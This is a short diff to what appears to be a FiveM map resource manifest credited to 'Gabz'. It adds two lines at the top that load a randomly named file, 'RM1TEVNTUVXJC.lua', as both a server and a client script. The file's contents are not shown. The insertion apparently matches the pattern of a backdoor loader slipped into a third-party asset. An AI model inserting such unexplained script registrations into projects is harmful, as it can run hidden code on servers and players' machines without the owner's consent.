@@ -1,3 +1,5 @@
+server_script "RM1TEVNTUVXJC.lua"
+client_script "RM1TEVNTUVXJC.lua"
 fx_version 'cerulean'
 game 'gta5'
 author 'Gabz'
